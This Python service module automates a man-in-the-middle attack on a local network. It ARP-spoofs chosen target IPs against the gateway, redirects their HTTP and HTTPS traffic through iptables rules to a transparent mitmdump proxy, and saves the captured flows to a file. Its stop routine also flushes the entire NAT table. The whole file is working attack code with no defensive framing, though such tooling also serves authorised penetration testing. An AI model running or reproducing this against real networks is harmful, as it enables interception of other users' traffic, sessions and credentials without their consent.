"""MITM service wrapping mitmproxy + ARP spoofing."""
import uuid, asyncio, logging
from typing import Optional
from app.config import settings
from app.models.schemas import MitmRequest
from app.utils.process_manager import process_manager
logger = logging.getLogger(__name__)

class MitmService:
    def __init__(self):
        self._active_session: Optional[dict] = None

    async def start(self, req: MitmRequest) -> dict:
        session_id = str(uuid.uuid4())[:8]
        flow_file = str(settings.CAPTURES_DIR / f"mitm_{session_id}.flow")
        log_file = str(settings.LOGS_DIR / f"mitm_{session_id}.log")
        await process_manager.run_sync(["sysctl", "-w", "net.ipv4.ip_forward=1"], timeout=5)
        for pf, pt in [("80", str(req.proxy_port)), ("443", str(req.proxy_port + 1))]:
            await process_manager.run_sync(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", req.interface, "-p", "tcp", "--dport", pf, "-j", "REDIRECT", "--to-port", pt], timeout=5)
        for tip in req.target_ips:
            asyncio.create_task(process_manager.run(["arpspoof", "-i", req.interface, "-t", tip, req.gateway], timeout=None))
        mitm_cmd = ["mitmdump", "--mode", "transparent", "--listen-port", str(req.proxy_port), "--save-stream-file", flow_file]
        if req.filter_hosts:
            mitm_cmd.extend(["--set", f"view_filter={' | '.join(f'~d {h}' for h in req.filter_hosts)}"])
        asyncio.create_task(process_manager.run(mitm_cmd, timeout=None))
        self._active_session = {"id": session_id, "interface": req.interface, "gateway": req.gateway, "targets": req.target_ips, "proxy_port": req.proxy_port, "flow_file": flow_file, "log_file": log_file}
        return self._active_session

    async def stop(self) -> dict:
        for proc in ["mitmdump", "mitmproxy", "arpspoof"]:
            await process_manager.run_sync(["pkill", "-f", proc], timeout=5)
        await process_manager.run_sync(["iptables", "-t", "nat", "-F"], timeout=5)
        await process_manager.run_sync(["sysctl", "-w", "net.ipv4.ip_forward=0"], timeout=5)
        session = self._active_session
        self._active_session = None
        return {"stopped": True, "session": session}

    def status(self) -> dict:
        return {"active": self._active_session is not None, "session": self._active_session}

mitm_service = MitmService()
